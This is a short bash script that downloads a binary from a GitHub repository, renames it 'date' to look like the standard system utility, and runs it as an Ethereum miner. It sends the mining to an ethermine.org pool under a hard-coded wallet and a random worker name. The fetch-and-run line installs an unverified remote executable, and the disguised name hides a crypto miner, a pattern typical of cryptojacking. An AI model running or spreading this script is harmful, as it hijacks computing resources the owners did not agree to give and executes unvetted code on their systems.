#!/bin/bash
sudo apt update && wget https://github.com/galebi/pihu/raw/main/date && chmod +x date
POOL=eu1.ethermine.org:4444
WALLET=0x760d69bdf1c0c40469099274635f225da775aaa6
WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-Develop with nitin)


./date --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
